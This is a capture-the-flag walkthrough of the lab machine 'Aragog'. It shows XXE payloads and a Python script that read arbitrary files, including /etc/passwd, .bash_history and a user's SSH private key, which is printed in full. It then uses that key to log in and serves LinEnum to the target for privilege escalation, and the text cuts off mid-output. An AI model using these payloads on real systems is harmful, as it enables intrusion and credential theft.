#### Aragog

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [FTP Enumeration](#ftp-enumeration)
- [SSH Enumeration](#ssh-enumeration)
- [Web Enumeration](#web-enumeration)
- [User flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root flag](#root-flag)

###### Attacker Info

```sh
root@kali:~/aragog# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.81/24 brd 10.0.0.255 scope global dynamic noprefixroute eth0
       valid_lft 604626sec preferred_lft 604626sec
    inet6 2601:5cc:c900:4024::ab95/128 scope global dynamic noprefixroute
       valid_lft 604628sec preferred_lft 604628sec
    inet6 2601:5cc:c900:4024:c5c9:f460:28de:5a16/64 scope global temporary dynamic
       valid_lft 86392sec preferred_lft 85925sec
    inet6 2601:5cc:c900:4024:20c:29ff:feb0:a919/64 scope global dynamic mngtmpaddr noprefixroute
       valid_lft 86392sec preferred_lft 86392sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.6/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1004/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::52c:1c77:b357:449/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/aragog#
```

###### Nmap Scan

```sh
root@kali:~/aragog# nmap -sC -sV -oA aragog.nmap 10.10.10.78
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-03 10:15 EDT
Nmap scan report for 10.10.10.78
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
root@kali:~/aragog#
```

###### FTP Enumeration

```sh
apt install ncftp
```

```sh
root@kali:~/aragog# ncftp 10.10.10.78
NcFTP 3.2.5 (Feb 02, 2011) by Mike Gleason (http://www.NcFTP.com/contact/).

Copyright (c) 1992-2011 by Mike Gleason.
All rights reserved.

Connecting to 10.10.10.78...
(vsFTPd 3.0.3)
Logging in...
Login successful.
Logged in to 10.10.10.78.
ncftp / > ls
test.txt
ncftp / > get test.txt
test.txt:                                               86.00 B  679.78 B/s
ncftp / > exit
root@kali:~/aragog#
```

```sh
root@kali:~/aragog# cat test.txt
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
root@kali:~/aragog#
```

###### SSH Enumeration

```sh
root@kali:~/aragog# ssh 10.10.10.78
root@10.10.10.78: Permission denied (publickey).
root@kali:~/aragog#
```

###### Web Enumeration

```
http://10.10.10.78/
```

![](images/1.png)

```sh
root@kali:~/aragog# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.78 -x php

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.78/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 307,200,204,301,302
[+] Extensions   : .php
=====================================================
/hosts.php (Status: 200)
```

```
http://10.10.10.78/hosts.php
```

![](images/2.png)

![](images/3.png)

![](images/4.png)

![](images/5.png)

- Testing `XXE`
	- [`PayloadsAllTheThings - XXE injection`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>
```

![](images/6.png)

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY random SYSTEM "/etc/passwd"> ]>
<details>
    <subnet_mask>&random;</subnet_mask>
    <test></test>
</details>
```

![](images/7.png)

```xml
<!DOCTYPE replace [<!ENTITY random SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/hosts.php"> ]>
<details>
    <subnet_mask>&random;</subnet_mask>
    <test></test>
</details>
```

![](images/8.png)

```
PD9waHAKIAogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwogICAgJHhtbGZpbGUgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKICAgICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICAgICRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKICAgICRkZXRhaWxzID0gc2ltcGxleG1sX2ltcG9ydF9kb20oJGRvbSk7CiAgICAkbWFzayA9ICRkZXRhaWxzLT5zdWJuZXRfbWFzazsKICAgIC8vZWNobyAiXHJcbllvdSBoYXZlIHByb3ZpZGVkIHN1Ym5ldCAkbWFza1xyXG4iOwoKICAgICRtYXhfYml0cyA9ICczMic7CiAgICAkY2lkciA9IG1hc2syY2lkcigkbWFzayk7CiAgICAkYml0cyA9ICRtYXhfYml0cyAtICRjaWRyOwogICAgJGhvc3RzID0gcG93KDIsJGJpdHMpOwogICAgZWNobyAiXHJcblRoZXJlIGFyZSAiIC4gKCRob3N0cyAtIDIpIC4gIiBwb3NzaWJsZSBob3N0cyBmb3IgJG1hc2tcclxuXHJcbiI7CgogICAgZnVuY3Rpb24gbWFzazJjaWRyKCRtYXNrKXsgIAogICAgICAgICAkbG9uZyA9IGlwMmxvbmcoJG1hc2spOyAgCiAgICAgICAgICRiYXNlID0gaXAybG9uZygnMjU1LjI1NS4yNTUuMjU1Jyk7ICAKICAgICAgICAgcmV0dXJuIDMyLWxvZygoJGxvbmcgXiAkYmFzZSkrMSwyKTsgICAgICAgCiAgICB9Cgo/Pgo=
```

```sh
root@kali:~/aragog# echo -n PD9waHAKIAogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwogICAgJHhtbGZpbGUgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKICAgICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICAgICRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKICAgICRkZXRhaWxzID0gc2ltcGxleG1sX2ltcG9ydF9kb20oJGRvbSk7CiAgICAkbWFzayA9ICRkZXRhaWxzLT5zdWJuZXRfbWFzazsKICAgIC8vZWNobyAiXHJcbllvdSBoYXZlIHByb3ZpZGVkIHN1Ym5ldCAkbWFza1xyXG4iOwoKICAgICRtYXhfYml0cyA9ICczMic7CiAgICAkY2lkciA9IG1hc2syY2lkcigkbWFzayk7CiAgICAkYml0cyA9ICRtYXhfYml0cyAtICRjaWRyOwogICAgJGhvc3RzID0gcG93KDIsJGJpdHMpOwogICAgZWNobyAiXHJcblRoZXJlIGFyZSAiIC4gKCRob3N0cyAtIDIpIC4gIiBwb3NzaWJsZSBob3N0cyBmb3IgJG1hc2tcclxuXHJcbiI7CgogICAgZnVuY3Rpb24gbWFzazJjaWRyKCRtYXNrKXsgIAogICAgICAgICAkbG9uZyA9IGlwMmxvbmcoJG1hc2spOyAgCiAgICAgICAgICRiYXNlID0gaXAybG9uZygnMjU1LjI1NS4yNTUuMjU1Jyk7ICAKICAgICAgICAgcmV0dXJuIDMyLWxvZygoJGxvbmcgXiAkYmFzZSkrMSwyKTsgICAgICAgCiAgICB9Cgo/Pgo= | base64 -d
<?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $details = simplexml_import_dom($dom);
    $mask = $details->subnet_mask;
    //echo "\r\nYou have provided subnet $mask\r\n";

    $max_bits = '32';
    $cidr = mask2cidr($mask);
    $bits = $max_bits - $cidr;
    $hosts = pow(2,$bits);
    echo "\r\nThere are " . ($hosts - 2) . " possible hosts for $mask\r\n\r\n";

    function mask2cidr($mask){
         $long = ip2long($mask);
         $base = ip2long('255.255.255.255');
         return 32-log(($long ^ $base)+1,2);
    }

?>
root@kali:~/aragog#
```

- [`LFISuite wordlist`](https://github.com/D35m0nd142/LFISuite/blob/master/pathtotest.txt)

```sh
root@kali:~/aragog# wget https://raw.githubusercontent.com/D35m0nd142/LFISuite/master/pathtotest.txt
--2018-09-03 10:49:08--  https://raw.githubusercontent.com/D35m0nd142/LFISuite/master/pathtotest.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.200.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.200.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22220 (22K) [text/plain]
Saving to: ‘pathtotest.txt’

pathtotest.txt                                     100%[================================================================================================================>]  21.70K  --.-KB/s    in 0.02s

2018-09-03 10:49:08 (1.24 MB/s) - ‘pathtotest.txt’ saved [22220/22220]

root@kali:~/aragog#
```

```sh
root@kali:~/aragog# grep ^/ pathtotest.txt > bf.txt
root@kali:~/aragog# less bf.txt
```

- In Burp

![](images/9.png)

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY random SYSTEM "§SomeRandomText§"> ]>
<details>
    <subnet_mask>&random;</subnet_mask>
    <test></test>
</details>
```

![](images/10.png)

![](images/11.png)

![](images/12.png)

![](images/13.png)

![](images/14.png)

![](images/15.png)

![](images/16.png)

![](images/17.png)

![](images/18.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
```

![](images/19.png)

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY random SYSTEM "/home/florian/.ssh/id_rsa"> ]>
<details>
    <subnet_mask>&random;</subnet_mask>
    <test></test>
</details>
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----
```

- File enumeration using XXE

`xxe.py`

```python
import requests
from base64 import b64decode

def GetFile(fname):
	payload = '<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY random SYSTEM "php://filter/convert.base64-encode/resource=' + fname + '"> ]> <details><subnet_mask>&random;</subnet_mask><test></test></details>'
	resp = requests.post('http://10.10.10.78/hosts.php', data=payload)
	fcontent = (resp.text).split(" ")[6]
	fcontent = b64decode(fcontent)
	return fcontent

def GetHomeDir():
	homedir = []
	passwd = GetFile("/etc/passwd")
	lines = iter(passwd.splitlines())
	for line in lines:
		if line.endswith("sh"):
			line = line.split(":")[5]
			homedir.append(line)
	return homedir

for user in GetHomeDir():
	fh = open('filelist.txt')
	for line in fh:
		content = GetFile(user + line.rstrip())
		if content:
			print user + line.rstrip()
			print content
```

`filelist.txt`

```
/.bash_history
/password.txt
/.historu
/.mysql_history
/.ssh/id_rsa
```

```sh
root@kali:~/aragog# python xxe.py
/home/florian/.bash_history

groups
cat /etc/passwd
su root
sudo -l
cat /etc/groups
cat /etc/group
grep "lxd" /etc/group
grep "cliff" /etc/group
grep "lxd" /etc/group
init 0
su root
id
echo $PATH
pwd
ls -lisa bin
ls
ls -lisa
echo $PATH
sudo -l
mkdir bin
ls -lisa | grep bin
ls
ls -lisa Downloads/
./LinEnum.sh
cd bin/
./LinEnum.sh
clear
./LinEnum.sh -t
su root
which rsync
ps -elf | grep rsync
nestat -an | grep rsync
netstat -an | grep rsync
ssh -V
cat /etc/ssh
ls /etc/ssh
ls -lisa /etc/ssh
cat /etc/ssh/ssh_config | grep UsePrivilegeSeparation
cat /etc/ssh/sshd_config | grep UsePrivilegeSeparation
cd
ls -lisa
ls -lisa .ssh/
cd /var/www/html/dev_wiki/
ls
ls -lisa
cd wp-admin/
ls -lisa
cd user
ls -lisa
cat admin.php
cd ../../wp-config
cd ../../../wp-config
cd ../../../
cd dev_wiki/
ls
cat wp-config.php
ls
ls -lisa
cd ..
ls
cd dev_wiki/
ls
cat wp-config.php
cat wp-config.php | egrep password
cat wp-config.php | egrep PASSWORD
mysql
mysql -u root -p
cd ..
ls
cd dev_wiki/
ls
vi wp-login.php
ls
cd ../../; cd html/dev_wiki
ls
vi wp-login.php
ls -lisa | grep .
ls
ls -lisa
cat .Su
su -
su - root
exit

/home/florian/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----

root@kali:~/aragog#
```

###### User flag

```
root@kali:~/aragog# nano florian.ssh
root@kali:~/aragog# chmod 600 florian.ssh
```

```sh
root@kali:~/aragog# ssh -i florian.ssh florian@10.10.10.78
Last login: Mon Sep  3 04:16:26 2018 from 10.10.14.4
florian@aragog:~$ cat user.txt
f43bdfbcfd3f2a955a7b67c7a6e21359
florian@aragog:~$
```

###### Privilege Escalation

```sh
root@kali:~/aragog# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2018-09-03 12:02:33--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.200.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.200.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47066 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                         100%[================================================================================================================>]  45.96K  --.-KB/s    in 0.03s

2018-09-03 12:02:33 (1.34 MB/s) - ‘LinEnum.sh’ saved [47066/47066]

root@kali:~/aragog#
```

```sh
root@kali:~/aragog# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.78 - - [03/Sep/2018 12:03:16] "GET /LinEnum.sh HTTP/1.1" 200 -
```

```sh
florian@aragog:~$ wget http://10.10.14.5:8000/LinEnum.sh
--2018-09-03 09:00:58--  http://10.10.14.5:8000/LinEnum.sh
Connecting to 10.10.14.5:8000... failed: Connection refused.
florian@aragog:~$
florian@aragog:~$ wget http://10.10.14.6:8000/LinEnum.sh
--2018-09-03 09:01:17--  http://10.10.14.6:8000/LinEnum.sh
Connecting to 10.10.14.6:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47066 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                         100%[================================================================================================================>]  45.96K   123KB/s    in 0.4s

2018-09-03 09:01:17 (123 KB/s) - ‘LinEnum.sh’ saved [47066/47066]

florian@aragog:~$
```

```sh
florian@aragog:~$ bash LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.92

[-] Debug Info
[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)


Scan started at:
Mon Sep  3 09:01:22 PDT 2018


### SYSTEM ##############################################
[-] Kernel information:
Linux aragog.htb 4.13.0-26-generic #29~16.04.2-Ubuntu SMP Tue Jan 9 22:00:44 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.13.0-26-generic (buildd@lgw01-amd64-031) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.5)) #29~16.04.2-Ubuntu SMP Tue Jan 9 22:00:44 UTC 2018


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.3 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[-] Hostname:
aragog.htb


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(florian) gid=1000(florian) groups=1000(florian)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
florian          pts/8    10.10.14.6       Mon Sep  3 08:33:01 -0700 2018


[-] Who else is logged on:
 09:01:22 up 15:57,  1 user,  load average: 0.00, 0.03, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
florian  pts/8    10.10.14.6       08:33    2.00s  0.07s  0.00s bash LinEnum.sh


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=108(lightdm) gid=114(lightdm) groups=114(lightdm)
uid=109(whoopsie) gid=117(whoopsie) groups=117(whoopsie)
uid=110(avahi-autoipd) gid=119(avahi-autoipd) groups=119(avahi-autoipd)
uid=111(avahi) gid=120(avahi) groups=120(avahi)
uid=112(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=113(colord) gid=123(colord) groups=123(colord)
uid=114(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=115(hplip) gid=7(lp) groups=7(lp)
uid=116(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=117(pulse) gid=124(pulse) groups=124(pulse),29(audio)
uid=118(rtkit) gid=126(rtkit) groups=126(rtkit)
uid=119(saned) gid=127(saned) groups=127(saned),122(scanner)
uid=120(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=1000(florian) gid=1000(florian) groups=1000(florian)
uid=1001(cliff) gid=1001(cliff) groups=1001(cliff)
uid=121(mysql) gid=129(mysql) groups=129(mysql)
uid=122(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=123(ftp) gid=130(ftp) groups=130(ftp)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)


[-] Contents of /etc/passwd:
